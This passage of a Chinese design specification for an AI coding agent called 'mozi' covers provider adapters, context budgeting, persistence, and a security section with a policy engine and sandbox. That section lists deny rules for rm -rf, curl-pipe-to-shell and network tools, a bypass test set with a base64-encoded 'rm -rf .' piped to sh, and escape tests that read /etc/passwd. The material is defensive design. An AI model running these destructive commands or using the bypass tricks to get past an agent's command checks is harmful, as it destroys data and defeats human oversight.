- 每份描述有 `descriptionVersion`，会话日志中记录使用的工具版本（可复现调试）；
- 描述变更走 PR + 在评测集上验证（防止「改描述改崩模型」）。

### 3.7 可测试性

- PatchParser/Matcher/Applier 全部纯函数，fuzz 测试：随机代码文本 → 随机变更 → 生成 patch → 断言结果等价；
- 每个工具以「输入 → 临时工作区 → 断言文件系统状态」的三明治测试；
- ToolRegistry 注册冲突、未知工具、schema 校验失败的负例全覆盖。

---

## M4 LLM Provider 层

### 4.1 目标与边界

**职责**：把各家模型的聊天接口统一为 mozi 内部协议；负责流式聚合、格式容错、能力探测、重试与用量统计。

**不做**：不参与 Agent 决策（引擎）；不管理密钥存储（配置层）；不运行模型（外部服务）。

### 4.2 对外契约（完整定义）

```ts
// packages/providers/src/types.ts
export interface ChatRequest {
  messages: ChatMessage[];              // 内部统一格式（M2 定义）
  tools?: Array<{ name: string; description: string; parameters: JSONSchema }>;
  signal?: AbortSignal;
  maxOutputTokens?: number;
  temperature?: number;                 // 默认 0（确定性优先）
  stopSequences?: string[];
  /** 会话级 usage 回调（引擎注入，累加） */
  onUsage?: (usage: TokenUsage) => void;
}

export interface LLMProvider {
  readonly id: string;                  // 'openai' | 'anthropic' | 'deepseek' | 'ollama' ...
  capabilities(): ProviderCapabilities;
  /** 流式调用。result() 在流结束后可用 */
  chat(req: ChatRequest): LLMStream;
}

export interface LLMStream extends AsyncIterable<StreamEvent> {
  result(): AssistantMessage;          // 必须在流迭代完成后调用
  /** 渲染给用户的消息（部分 model 最后才给 toolCalls） */
}

export type StreamEvent =
  | { type: 'text.delta'; text: string }
  | { type: 'reasoning.delta'; text: string }
  | { type: 'toolcall.args.delta'; index: number; fragment: string }
  | { type: 'usage'; usage: TokenUsage };

export interface ProviderCapabilities {
  parallelToolCalls: boolean;
  vision: boolean;
  reasoning: boolean;
  maxContextTokens: number;
  streamingToolArgs: boolean;
  systemPromptAsSeparateField: boolean;  // anthropic 等
}
```

### 4.3 流式聚合器（内部统一实现）

```ts
// packages/providers/src/aggregator.ts
/**
 * 各家 provider 把原生 chunk 转成「增量事件」喂给 Aggregator，
 * Aggregator 负责把 toolcall.args.delta 按 index 拼成完整 JSON，
 * 结束时机（finish_reason）触发 result 生成。
 */
export class StreamAggregator {
  private buffers: Map<number, string> = new Map();   // index → 已拼参数片段
  private text: string[] = [];
  private reasoning: string[] = [];

  feed(ev: StreamEvent): void {
    if (ev.type === 'text.delta') this.text.push(ev.text);
    if (ev.type === 'toolcall.args.delta') {
      const buf = this.buffers.get(ev.index) ?? '';
      this.buffers.set(ev.index, buf + ev.fragment);
    }
  }

  finish(): AssistantMessage {
    const toolCalls = [...this.buffers.entries()].map(([index, raw]) => {
      const args = this.safeParseJson(raw);          // 见 4.6
      return { id: `tc_${index}`, name: this.names[index], arguments: args, riskLevel: 'read' };
    });
    // riskLevel 在引擎侧根据 name 查工具表确定；这里占位
    return {
      role: 'assistant',
      content: this.text.join('') || null,
      toolCalls: toolCalls.length ? toolCalls : undefined,
      reasoning: this.reasoning.join(''),
    };
  }
}
```

### 4.4 OpenAI 兼容适配器（覆盖 90% 端点）

```ts
// packages/providers/src/openai.ts
export class OpenAICompatibleProvider implements LLMProvider {
  constructor(private cfg: { baseUrl: string; apiKey: () => string; model: string }) {}

  async *chat(req: ChatRequest): AsyncIterable<StreamEvent> {
    const client = new OpenAI({
      baseURL: this.cfg.baseUrl,           // 唯一入口：DeepSeek/Qwen/GLM/Ollama/vLLM 全靠它
      apiKey: this.cfg.apiKey(),
      timeout: 60_000,
    });
    const stream = await client.chat.completions.create(
      {
        model: this.cfg.model,
        messages: toOpenAiMessages(req.messages),
        tools: req.tools?.map(toOpenAiTool),       // {type:'function',function:{name,description,parameters}}
        stream: true,
        temperature: 0,
      },
      { signal: req.signal },
    );
    // 每个 chunk 可能是：内容增量 / tool_call 增量 / usage / finish
    for await (const chunk of stream) {
      const choice = chunk.choices?.[0];
      if (choice?.delta?.content) yield { type: 'text.delta', text: choice.delta.content };
      for (const tc of choice?.delta?.tool_calls ?? []) {
        // index 稳定；name 只在首片出现，args 增量拼装
        yield { type: 'toolcall.args.delta', index: tc.index, fragment: tc.function?.arguments ?? '' };
        if (tc.function?.name) this.aggregator.names[tc.index] = tc.function.name;
      }
      if (chunk.usage) yield { type: 'usage', usage: { ...chunk.usage, model: this.cfg.model } };
    }
    yield* this.finish();
  }
}
```

注意：OpenAI SDK 的 `chat.completions.create` 流式即 `ReadableStream`，需用 `for await`；SDK 内建重试（默认 2 次），Provider 层关闭 SDK 重试改为统一策略（4.8），避免双重退避。

### 4.5 Anthropic 适配器（差异点）

| OpenAI | Anthropic |
|--------|-----------|
| `system` 是普通消息 | system 是独立顶层字段（`systemPromptAsSeparateField`） |
| `tool_calls` 在 assistant delta | `tool_use` content block（`input_json_delta` 渐进） |
| `tool` role 消息 | `tool_result` user 消息（tool_use_id 关联） |
| 无 thinking 字段 | `thinking` block（`signature` 需回传） |

实现要点：
- 消息转换：`system` 抽离；assistant 的 reasoning 单独放（不回传，除非模型要求）；tool 结果包成 `content: [{type:'tool_result', tool_use_id, content}]`；
- 流式：`content_block_delta` 里 `text_delta` / `input_json_delta` / `thinking_delta` 分别映射；
- 结束：`message_stop` + `usage`。

### 4.6 参数 JSON 容错（宽松修复算法）

```ts
function safeParseJson(raw: string): unknown {
  try { return JSON.parse(raw); } catch (e) {
    // 逐级修复：
    // 1. 去除尾随逗号
    const noTrailing = raw.replace(/,\s*([}\]])/g, '$1');
    try { return JSON.parse(noTrailing); } catch {}
    // 2. 去除注释 // 与 /* */
    const noComments = noTrailing.replace(/\/\/.*$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '');
    try { return JSON.parse(noComments); } catch {}
    // 3. 截断恢复：尝试在最近的 , 或 { 处截断后解析
    const cut = noComments.slice(0, Math.min(noComments.length, 4000));
    const lastBrace = Math.max(cut.lastIndexOf('}'), cut.lastIndexOf(']'));
    try { return JSON.parse(cut.slice(0, lastBrace + 1)); } catch {}
    // 全部失败：返回 { __parseError: raw.slice(0, 200) }（引擎转给模型要求修正）
    return { __parseError: raw.slice(0, 200) };
  }
}
```

失败路径：解析失败 → 引擎把 `ERR_TOOLCALL_PARSE` 作为 tool result（isError）回填模型，模型重发修正后的参数。**核心原则：模型可自纠，不崩溃。**

### 4.7 能力协商与运行时检测

```ts
export interface ProviderRegistry {
  resolve(modelId: string): LLMProvider;
  list(): ProviderMeta[];   // 配置中所有可用端点
}

// 能力来源优先级：静态配置 > 运行时探测 > 内置默认表
运行时探测（仅对未配置的模型执行一次并缓存）：
  - maxContextTokens: 由模型名匹配内置表（'deepseek-chat': 128k 等）+ baseURL 参数覆盖
  - reasoning: 请求带 thinking? 试一次 stream 看是否有 reasoning.delta（探测）
  - vision: 内置表（如 gpt-4o、qwen-vl、glm-4v）+ 探测失败标记 unknown（降级为「不可用」）
```

引擎消费方式：`vision 不可用时过滤图片消息并提示模型`；`parallelToolCalls=false 时串行发 tool_calls（分多次请求）`；`streamingToolArgs=false 时等待整块参数（一次性 delta）`。

### 4.8 重试与退避

```
可重试错误：网络错误、429（带 Retry-After）、5xx、超时
不可重试：401/403（鉴权）、400（请求非法——通常是模型参数生成错误）

策略：
  maxRetries = 2（可配置）
  backoff = 500ms * 2^attempt + jitter(±20%)
  429 按 Retry-After 延长
  重试前发出 internal.debug 事件（调试可见）
```

### 4.9 用量与成本

- 每次 `chat` 结束，从 provider 的 usage 字段更新 `TokenUsage`；无 usage 时用估算（M5）；
- 成本表 `providers/pricing.ts`（按模型定价常量，可配置覆盖），按 `input*price + output*price` 计算 `usage.costUsd`；
- 会话累计成本由引擎在 `turn.completed` 前检查（见 M1 的 `maxCost`）。

### 4.10 测试

- 每家 provider 用 **fixture 回放**（录制真实 API 响应片段）跑契约测试：流式分片组合、工具参数拼装、usage 解析、容错路径；
- Anthropic 与 OpenAI 的 message 互转测试：来回转换无损（schema 级 diff 断言）；
- `safeParseJson` 的对抗语料测试（截断、注释、尾逗号、混合引号）。

---

## M5 上下文管理

### 5.1 目标与边界

**职责**：在有限 token 预算内，为模型组装「信息密度最高」的上下文窗口；维持会话内文件视图的新鲜度；注入项目指令。

**不做**：不生成 prompt 内容（系统提示词在 core 的 prompts 目录）；不参与模型调用（M4）。

### 5.2 Token 估算

```ts
// packages/core/src/context/estimator.ts
/**
 * 优先级：真实 usage（provider 返回）> 字符估算
 * 字符估算公式（中英混合经验）：
 *   tokenCount ≈ ceil(汉字数 / 1.5) + ceil(其他字符数 / 4)
 * 即：把每个字符按 Unicode 码点判定 CJK 区间，混合计算。
 */
export function estimateTokens(text: string): number;
```

校准机制：每轮拿到 provider 真实 usage 后，与估算值比较，动态调整系数（`k_adj = true / estimated`，滑动窗口 8 轮取中位数），让估算误差收敛到 ±10% 内。

### 5.3 预算分配与裁剪

```
预算计算（每轮 buildContext 时执行）：
  maxTokens = provider.maxContextTokens（如 128_000）
  安全余量 = max(2000, maxTokens * 0.05)      // 预留模型输出空间
  budget = maxTokens - 安全余量

分层（按优先级由高到低）：
  P0 系统提示 + 工具定义（固定）      ≈ 8%
  P1 AGENTS.md（当前层级注入）        ≈ 4%（单文件超 4k token 截断）
  P2 当前轮最新消息（最后 10 条，原文保留）≈ 28%
  P3 历史消息（可压缩区）             ≈ 60%

裁剪算法（buildContext 时执行）：
  1. P3 从最老的消息起裁剪，直到历史总长 ≤ P3 配额
  2. 若裁剪后 P2 仍超配：从 P2 最早的消息起裁（最坏情况只保留最近 2 条 + 系统提示）
  3. 若触发条件满足（使用率 ≥ 80%），执行 Auto-Compact（5.4），否则直接裁剪
```

裁剪只影响「本轮的模型可见性」；事件日志中的完整历史不受影响（可回放/可扩展）。

**子智能体例外（v1.1）**：子会话使用独立的 ContextManager 实例与独立预算（模板定义，如 explore 32k），与主会话预算互不侵占——这正是子 Agent 的价值（隔离膨胀）。见 M12 §12.9。

### 5.4 Auto-Compact（自动压缩）完整流程

```
触发条件：estimatedUsage / budget ≥ autoCompactThreshold（默认 0.8）
且距离上次压缩 ≥ minIntervalTurns（默认 3 轮，防频繁压缩）

流程：
1. 选择压缩区：历史消息中最早的 40% 轮次（至少保留最近 5 轮原文）
2. 调轻量模型（config.compactModel，默认同 executor）生成结构化摘要：
   输入 prompt（固定模板，prompts/compact.md）：
     请你把以下历史对话压缩为结构化摘要，字段：
     task / done[] / pending[] / keyFiles[] / keyDecisions[] / openQuestions[]
     不要遗漏任何未完成的工具调用与待办。
3. 替换：压缩区 → 一条 role=system 的摘要块（prepend 到历史区）
4. 事件：context.compacted { removedTurns, savedTokens, summary }
5. UI 渲染：显示摘要卡片，用户可点「展开详情」查看被压缩事件的原始日志（从事件流重放）

失败处理：压缩模型调用失败 → 跳过本次压缩（不阻塞任务），下次触发时重试；
         摘要生成 token 超过 8k → 分段摘要，或仅摘要 keyFiles 与 pending。
```

### 5.5 AGENTS.md 分层加载

```ts
// packages/core/src/context/agents.ts
/**
 * 加载顺序与合并规则：
 *   ~/.mozi/AGENTS.md            （用户全局，优先级最高）
 *   <workspace>/AGENTS.md        （项目级）
 *   <workspace>/CLAUDE.md 或 GEMINI.md（兼容导入，存在即读）
 * 子目录级：当工具调用涉及 <dir> 时，惰性加载 <dir>/AGENTS.md（并缓存）
 *
 * 合并：全局 → 项目 → 子目录（后者覆盖前者同名规则段）
 * 注入格式：
 *   <file:AGENTS.md>
 *   [全局] ...
 *   [项目] ...
 *   [子目录 src/components] ...
 *   </file>
 */
```

每个文件的缓存带 mtime 失效（编辑后自动重载）。

**记忆注入（v1.5，M16 联动）**：L1 用户记忆 + L2 项目记忆在 P1 层与 AGENTS.md 同段注入（合计预算 ≤2k，超出时 AGENTS.md 优先）；L3 语义记忆按当前任务检索 top-k 注入（独立 2k 预算，每 5 轮刷新）。注入格式与信任标注见 M16 §16.3。

### 5.6 文件新鲜度跟踪

```ts
interface FileFingerprint { mtimeMs: number; size: number; contentHash: string; }

class FreshnessTracker {
  private seen = new Map<string, FileFingerprint>();
  /** 工具读写路径后调用：标记该文件在新一轮中已被修改 */
  invalidate(path: string): void;
  /** 每轮 buildContext 时调用，返回「自上次读取后变化的文件列表」 */
  checkDirty(): string[];
}
```

注入方式：脏文件列表以一条 system 消息插入本轮上下文头部：

```
[注意] 以下文件自上次读取后已被修改，请重新 read_file 确认最新内容：
- src/engine/agent-engine.ts
```

- 文件修改但**从未被模型读过**的不提示（无意义）；
- `shell` 命令也可能改文件——命令执行完成后对工作区做**增量扫描**（比较目录 mtime，命中则全列表比对），成本可控（每命令 <10ms，10k 文件）。

### 5.7 上下文诊断（开发者工具）

- `mozi context --debug`：打印预算表、各层占比、估算误差、压缩历史；
- 每轮 `buildContext` 后缓存在会话内存（最多 3 轮），供 UI 的「上下文」面板展示；
- 压缩前后对比 diff（系统消息级），便于评测压缩质量。

### 5.8 可测试性

- Estimator 校准单测（构造 3:7 中英混合语料，断言误差收敛）；
- 预算裁剪的分层用例（历史超、活跃超、系统超三档）；
- Auto-Compact 集成测试：ScriptedProvider 回放「压缩请求 + 摘要响应」，断言替换正确、事件正确、压缩后可继续完成任务；
- FreshnessTracker：模拟 mtime 变化 / shell 修改 / 目录扫描。

---

## M6 安全策略与沙箱

> 安全四层防线：① PolicyEngine 审批策略 → ② 命令风险分析 → ③ 沙箱执行隔离 → ④ 工作区路径边界。
> 本文按层深化，另含密钥管理与审计日志。

### 6.1 策略引擎（PolicyEngine）

#### 6.1.1 规则模型（v1）

```ts
// packages/policy/src/types.ts
export type PolicyMode = 'readonly' | 'auto' | 'full-auto';

export interface PolicyConfig {
  mode: PolicyMode;
  rules: PolicyRule[];               // 用户自定义，优先级高于 mode 默认
}

export interface PolicyRule {
  id: string;                        // 审计引用
  match: {
    tool?: string | string[];        // 工具名
    commandPattern?: string;         // shell 专用：JS RegExp 源码（全局匹配命令文本）
    pathGlob?: string;               // 文件类：glob（如 '.env*'、'**/secrets/**'）
  };
  action: 'allow' | 'ask' | 'deny';
}

export type PolicyDecision =
  | { type: 'allow'; ruleId?: string }
  | { type: 'ask'; reason: ApprovalReason; ruleId: string }
  | { type: 'deny'; ruleId: string };
```

#### 6.1.2 评估算法（确定性与优先级）

```
evaluate(call, config) → PolicyDecision

1. 匹配顺序（高→低）：用户自定义 rules（按配置顺序）→ 内置安全规则 → 模式默认表
2. 每条规则匹配成功的条件（全部满足才生效）：
   - tool 匹配：call.name === tool（支持数组任一）
   - commandPattern：call.name==='shell' 且 正则 test(call.arguments.command)
   - pathGlob：call.name 是文件类 且 glob 命中 call.arguments.path
3. 首个命中规则的 action 即最终决策（first-match-wins）
4. 未命中任何规则 → 落入 mode 默认表（见 M1 方案书表格）
5. 例外：'deny' 永远生效且不可被 mode 覆盖（'full-auto' 也不能绕过 deny）

**无人值守分支（v1.3，M13 联动）**：`context.isUnattended=true`（定时任务 headless 执行）时，评估阶段不存在 'ask' 决策——一切 ask 替换为 deny，deny 结果携带原因供模型自纠（不变式 I1）；'full' 模式在任务创建时强制校验 sandboxLevel ≥ 3（I4）。交互模式行为完全不变。

**子会话评估（v1.1）**：子智能体的策略在 spawn 时由 `tighten(parent, template)` 单调收紧合成（只严不松），deny 规则全链继承；审批 ask 冒泡到父会话 UI（M12 §12.6/§12.7）。不变式测试见 M12 §12.13。
```

**内置安全默认规则**（`policy/builtin-rules.ts`，全部为 deny/ask）：

```ts
[
  { id: 'R_rm_rf',       match: { tool: 'shell', commandPattern: 'rm\\s+-(rf|fr)' },          action: 'deny' },
  { id: 'R_git_push_f',  match: { tool: 'shell', commandPattern: 'git\\s+push\\s+.*--force' }, action: 'ask' },
  { id: 'R_curl_pipe_sh',match: { tool: 'shell', commandPattern: '(curl|wget).+\\|\\s*(ba)?sh' },action: 'deny' },
  { id: 'R_net',         match: { tool: 'shell', commandPattern: '(curl|wget|nc|ssh|git\\s+clone)' }, action: 'ask' },
  { id: 'R_secrets',     match: { tool: 'write_file', pathGlob: '{.env*,**/secrets/**,**/*.pem,**/*.key}' }, action: 'ask' },
  { id: 'R_erase',       match: { tool: 'write_file', pathGlob: '{**/*.lock,**/node_modules/**}' },          action: 'ask' },
}
```

#### 6.1.3 审批挂起模型（与引擎的交互）

```
引擎流程：
tool.requested → evaluate()
  allow → 直接 EXECUTING
  deny  → 生成 deny 结果（ToolResult.isError=true，内容=规则说明）回填模型；发 tool.completed
  ask   → 发 tool.approval.required（挂起）
           UI 应答 resolveApproval(session, callId, decision)
           决策持久化：policy 模块记录（见审计）

挂起超时：默认 10 分钟无应答 → 自动 deny + 提示 UI 超时原因（防挂起泄漏）
会话内记忆：allow 一次可在本轮会话内对同工具+同命令幂等放行（UI 选项「本次会话都允许」）
```

### 6.2 命令风险分析（RiskAnalyzer）

#### 6.3.1 结构化拆解

```
输入：原始命令字符串
输出：CommandSegment[] + 综合风险级

拆解步骤：
1. shell 词法分析：用 tree-sitter-bash（或自研轻 tokenizer）识别
   &&、||、;、| 分隔出的子命令段（保留管道语义 flag）
2. 每段识别：主命令（argv[0]，去路径前缀）、参数列表
3. 每段风险评级：
   - 白名单命令（内置 allowlist：ls/cat/grep/npm test/npm run build/git status/...）→ safe
   - 写操作（rm/mv/cp/tee/chmod/chown/git push/git commit/npm publish/...）→ side-effect
   - 网络（curl/wget/nc/ssh/scp/git clone/npm install）→ network
   - 高危（eval/sh/bash/-c、base64 -d、dd、mkfs、> /dev/...）→ high
4. 综合：max(各段风险)；同时统计「管道链」风险（curl|sh 组合）
```

输出给 UI 审批卡片的结构：

```ts
interface CommandSegment {
  text: string;                 // 原始分段文本
  argv: string[];               // 解析后的命令与参数
  risk: 'safe' | 'side-effect' | 'network' | 'high';
  matchedRule?: string;         // 命中的风险规则 ID
  color: 'green' | 'yellow' | 'red';
}
```

#### 6.3.2 对抗测试集（防绕过）

- 引号混淆：`rm -- -rf`（`--` 结束选项）、`r""m -rf`；
- 变量展开：`X="rm -rf"; $X .`；
- base64：`echo cm0gLXJmIC4=|base64 -d|sh`；
- 注释注入：`ls # rm -rf .`（tokenizer 需正确处理注释）；
- 管道混淆：`curl x|tee /tmp/a` 与 `curl x|sh` 区分；
- Unicode 同形（`.` vs `．`）不做处理但文档声明（防绕过靠沙箱兜底，而非正则）。

**设计原则：RiskAnalyzer 不追求完备（不可能），它负责把「值得人类看」的命令拆清楚；真正的兜底是沙箱。**

### 6.4 沙箱（四级隔离）

```
沙箱接口（统一抽象）：
interface SandboxRunner {
  level: 0 | 1 | 2 | 3;
  exec(cmd: string, opts: { cwd; env; timeoutMs; networkAllowed: boolean }): Promise<SandboxResult>;
  // result: { stdout, stderr, exitCode, durationMs }
}
```

#### L0 —— 无隔离

仅策略拦截；进程直接 spawn（调试/信任环境专用；CLI 默认不用）。

#### L1 —— 进程资源限制（全平台，默认基线）

```
- 超时强杀：超时后先 SIGTERM → 1s 后 SIGKILL（Windows 用 taskkill /T）
- 内存上限：POSIX setrlimit(RLIMIT_AS) / Windows Job Object Join
- 子进程组回收：POSIX 同进程组 kill(-pgid)；Windows Job Object（KILL_ON_JOB_CLOSE）
- 单命令同时运行数：串行（引擎已保证 exec 串行）
```

#### L2 —— OS 沙箱

```
macOS（sandbox-exec，Seatbelt）：
  (version 1)
  (deny default)
  (allow process*)
  (allow file-read*)
  (allow file-write* (subpath "workspace"))
  (allow network-outbound (remote (tcp "*.npmjs.org") ...))
  —— 白名单外一切 deny；用 ephemeral profile 文件传给 sandbox-exec

Linux（Landlock + seccomp）：
  用 landlock ABI（path_beneath 允许 workspace 读写；network 端口白名单需要内核支持）
  seccomp-bpf 白名单 syscall（禁用 ptrace/load_module/clone(CLONE_NEW*) 等 ~40 项）
  降级：内核不支持 Landlock → 自动降级 L1 并告警（不静默）

Windows：
  无 Seatbelt 等价物 → L2 实现为：
  - Job Object：内存/CPU/进程数上限 + KILL_ON_JOB_CLOSE
  - 受限令牌（Remove privileges：SeDebugPrivilege、SeTakeOwnershipPrivilege...）
  - AppContainer 可选（完整隔离需要 manifest 签名，做「尽力而为」）
  - 文档明示：Windows 上的 full-auto 建议配 Docker（L3）
```

#### L3 —— 容器执行（Docker/Podman）

```
执行模型（diff-apply 模式，双目录）：
  1. 启动容器：挂载 workspace 只读（ro），另挂一个临时「工作卷」rw
  2. 命令在容器内执行，产物写工作卷
  3. 执行结束后：比较工作卷与 workspace 的差异 → 生成 diff（复用 M3 diff 能力）
  4. diff 呈给用户/策略批准 → 应用回真实 workspace（或由用户手动合并）
  5. 网络：默认全禁；--allow-net 时用本地代理（mitm 白名单域名放行）

安全细节：
  - 容器无特权（--privileged=false）、无新用户命名空间
  - 镜像固定 digest（杜绝 tag 漂移）——构建期锁定 base 镜像
  - 每任务新建容器、结束后销毁（--rm）
  - 检测用户是否安装 Docker：无则降级 L2/L1 并提示
```

**沙箱选择链（运行时决策）**：

```
configured sandbox.level >= 3 && docker available → L3
else configured >= 2 && platform L2 available → L2
else → L1（并输出一次告警「当前为 L1 低隔离」）
```

**网络代理（L2/L3 共用）**：本地起 `http-proxy`（或复用 mitmproxy），域名白名单默认 `registry.npmjs.org / registry.yarnpkg.com / pypi.org / files.pythonhosted.org / github.com / api.github.com`，用户可用 `--allow-net` 扩展。

### 6.5 工作区路径边界

```ts
// packages/tools/src/workspace.ts
export class Workspace {
  constructor(root: string) {}   // 启动时绝对化

  /** 解析 + 规范化 + 边界校验（所有文件类工具入口） */
  resolve(relativeOrAbsolute: string): string {
    const abs = path.isAbsolute(p) ? p : path.resolve(this.root, p);
    const normalized = path.normalize(abs);
    if (!this.inside(normalized)) throw new MoziError('ERR_PATH_OUTSIDE');
    return normalized;
  }

  /** symlink 二次校验：解析链上的每个节点，必须在边界内 */
  private inside(p: string): boolean {
    let cur = p;
    for (let depth = 0; depth < 64; depth++) {
      cur = path.dirname(cur);
      if (cur === this.root) return true;
      if (path.dirname(cur) === cur) return false;   // 到根
    }
    return false;
  }
}
```

- 每个工具在 `resolve` 后**再校验 symlink**（`realpath` 一次，确认仍在 root 内）；
- git 仓库边界：`git rev-parse --show-toplevel` 探测，若 workspace 在 repo 内则额外允许 repo 内（含子模块目录）的读写；
- `.mozi/` 目录本身对模型**只读**（防会话文件被篡改），在 workspace 中特殊豁免。

### 6.6 密钥管理

- 配置文件（`~/.mozi/config.json`）**只存环境变量名**，运行时 `process.env[key]` 读取；
- 桌面端通过 Electron `safeStorage`（OS 级加密）存储密钥，导出给主进程；CLI 支持 `mozi auth` 引导写入 shell profile；
- 进程内密钥不落日志、不进事件流；工具 `display` 渲染时对 `apiKey` 字段打码（`maskSecret` 统一入口）。

### 6.7 审计日志

```
~/.mozi/audit/<YYYY-MM-DD>.jsonl   （追加写）

记录（每个安全相关事件）：
{ ts, sessionId, kind: 'approval'|'command'|'sandbox'|'path', 
  tool, command?, path?, decision, ruleId?, sandboxLevel, durationMs }
```

- 与事件日志（M7）分离：审计日志**永不压缩、永不清除**（除用户手动清理），供安全复盘；
- `mozi audit --since --until` 查询命令（按命令/规则/沙箱级别过滤）。

### 6.8 可测试性

- PolicyEngine：规则表驱动测试（每种 match 组合 + 优先级 + deny 不可覆盖）；
- RiskAnalyzer：对抗集回归（§6.3.2 全部用例做成 vitest 参数化）；
- 沙箱：真实进程逃逸测试矩阵（macOS/Linux/Windows CI 各自跑）——写 `/etc`、读 `/etc/passwd`、启动隐藏进程、网络外联，全部断言被拦截；
- Workspace：路径穿越 / symlink / 相对路径绕过的用例集。

---

## M7 会话与持久化

### 7.1 目标与边界

**职责**：以事件溯源方式持久化会话全部状态；提供 resume / fork / 回放 / 查询；保证崩溃安全。

**不做**：不做数据库（无 SQL）；不做跨设备同步（协议层预留）；不做运行时状态（内存态在 M1）。

### 7.2 目录布局

```
~/.mozi/
├── sessions/
│   └── <sessionId>/
│       ├── events.jsonl            # 事件主文件（追加写）
│       ├── meta.json              # 会话元信息（原子写，见 7.6）
│       ├── snapshots/             # 文件写入前快照（undo 用，M3）
│       └── subs/                  # 子智能体会话（v1.1，见 M12 §12.10）
│           └── sub-<n>/
│               ├── events.jsonl    # 子事件全量（独立完整布局）
│               └── meta.json       # { parentSessionId, agentType, prompt, status, usageTotal }
├── tasks/                          # 定时任务（v1.3，见 M13 §13.8）
│   ├── tasks.json                  # 任务清单（原子写 + schemaVersion 迁移）
│   ├── locks/                      # 三层文件锁（tick/任务/工作区）
│   ├── worktrees/                  # branch 产物临时 worktree
│   └── runs/<taskId>/              # 运行记录（元数据 + 完整会话布局 + 报告）
├── audit/                         # 审计日志（M6）
├── config.json
└── logs/
```

`sessionId` 生成：`<cwd-hash>-<yyyyMMdd>-<rand8>`（便于按项目检索）。

### 7.3 events.jsonl 格式规格

```
每行一个 JSON 对象，即一个 AgentEvent（M2 定义，外加 _v:1）。
行内无换行（序列化时对字符串字段做 JSON 转义即可，天然安全）。
示例：
{"type":"session.started","sessionId":"...","config":{...},"ts":"2026-09-11T10:00:00.000Z"}
{"type":"turn.started","turnId":"...","input":"修复登录页 bug","ts":"..."}
{"type":"tool.requested","call":{"id":"tc_0","name":"read_file",...},"ts":"..."}
...
```

**约束**：
- 事件按发生顺序追加（追加即排序，重放无需排序）；
- 写失败（磁盘满）→ 引擎收到 `ERR_PERSIST_WRITE`，会话标记 `unflushed`，UI 提示；
- 事件体积控制：`message.delta` 大量高频事件**不落盘**（它们只是流式渲染的中间态；`message.completed` 才是权威）。落盘事件白名单：

```
落盘：session.* / turn.* / tool.* / context.compacted / token.usage(聚合) /
      task.completed / error / message.completed
不落盘：message.delta / internal.debug
```

### 7.4 写入策略（崩溃安全）

```ts
class EventLogWriter {
  private fd: FileHandle;
  private buffer: Buffer = Buffer.alloc(0);
  private flushTimer: NodeJS.Timeout;

  append(ev: AgentEvent) {
    this.buffer += JSON.stringify(ev) + '\n';
    // 500ms 批量 fsync：写缓冲 → fsync（不每次同步）
    if (this.buffer.length >= 64 * 1024) this.flushNow();
  }
  async flushNow() { await this.fd.write(this.buffer); await this.fd.sync(); this.buffer = ''; }
  async close()   { await this.flushNow(); await this.fd.close(); }
}
```

**崩溃语义**：最多丢失最后一个未 fsync 的事件（<500ms），但**已发给 UI 的事件从不丢失**——因为事件先进内存环形缓冲，UI 渲染与落盘是同一份数据的两条消费者。

**顺序保证**：单会话单写者（引擎持有唯一 writer），多会话各自独立文件，无跨会话并发问题。

### 7.5 重放（resume）算法与性能

```ts
// packages/core/src/session/replay.ts
export async function replayEvents(logPath: string): Promise<SessionState> {
  // 流式读，逐行 parse，折叠状态
  const state = emptyState();
  for await (const line of readLines(logPath)) {
    const ev = migrateEvent(JSON.parse(line));   // M2：版本迁移
    reduce(state, ev);                            // 状态折叠（纯函数）
  }
  return state;
}
```

**折叠（reduce）语义**：每种事件对 `SessionState` 的影响：

| 事件 | 对状态的影响 |
|------|------------|
| turn.started | 记录当前 turnId |
| message.completed | push 到 `messages[]`（含 toolCalls） |
| tool.requested / started / completed | 更新 tool 台账（总数、成功率、耗时） |
| tool.approval.resolved | 归档审批决策（供审计） |
| context.compacted | 记录压缩历史（不回放压缩后的摘要内容——模型上下文由 M5 重建，重放只恢复「会话视图」） |
| token.usage / turn.completed | 累加用量与成本 |
| task.completed | 记录完成态 |

**性能优化**：
- `meta.json` 存**尾部游标**（最后成功写事件的行偏移），resume 时可从 offset 开始（首次全量重放只做一次；后续 `mozi resume` 重复进入同一会话时增量）；
- 重放跳过无状态事件（delta）已天然减少 IO；
- 10 万事件重放目标 < 2s（Node 流式 + 每行 JSON.parse，实测量级足够）。

### 7.6 会话元数据 meta.json

```json
{
  "sessionId": "…",
  "workspace": "C:\\work\\myapp",
  "createdAt": "…", "updatedAt": "…",
  "status": "idle" | "running" | "completed" | "interrupted",
  "lastEventOffset": 12345,
  "model": "deepseek-chat",
  "usageTotal": { "inputTokens": 0, "outputTokens": 0, "costUsd": 0 },
  "unflushed": false,
  "forkedFrom": null | "sessionId:eventIndex"
}
```

- `updatedAt` 每 5s 更新一次（不每次写，防高 IO）；
- `fork` 时复制 `events.jsonl` 前 N 行 + `meta.napshotFrom` 指向源会话。

### 7.7 并发控制

- 同一 session 的 writer 由引擎持有（`session.running` 锁，见 M1）；
- 不同进程同时打开同一会话（桌面 + CLI 双开）：**最后写入者胜 + 版本冲突检测**——写前比较 `lastEventOffset` 与内存中的期望值，不一致则抛 `ERR_SESSION_CONFLICT`（UI 提示「该会话已被其他进程修改，请刷新」）；
- 桌面端多窗口共享会话通过主进程单例（M10）。

### 7.8 生命周期与 GC

```
保留策略：默认 30 天（配置可调）
GC 时机：每次 `mozi sessions` / 启动时检查
GC 规则：updatedAt 超过保留期 → 整个目录移入 ~/.mozi/trash/<ts>-<sessionId>
        （软删除，用户可在 7 天内手动恢复；之后可彻底清除）
会话列表查询：mozi sessions 读取所有 meta.json（不重放事件，毫秒级）
```

### 7.9 数据迁移

- `migrateEvent()` 与 M2 版本化配套；
- `meta.json` 加 `schemaVersion`，未来格式变更走迁移脚本目录 `migrations/`，启动时自动应用；
- 迁移前强制备份原文件（`meta.json.bak`）。

### 7.10 可测试性

- 写入/读取往返：写 10k 事件 → 重放 → 状态与事件数完全一致（快照断言）；
- 崩溃模拟：写入中途 kill（子进程 + SIGKILL）→ 重放，断言无损坏事件、无错误状态；
- fork 语义：fork 后两侧事件独立、各自可 resume；
- GC 边界：超期/未超期、手动恢复路径。

---

## M8 MCP 集成（完整客户端）

### 8.1 目标与边界

**职责**：以客户端身份接入外部 MCP Server，把其能力（Tools / Resources / Prompts / Sampling / Elicitation）映射进 mozi 的工具系统、上下文系统、命令系统与审批体系，让 MCP 生态成为 mozi 的一等扩展机制。

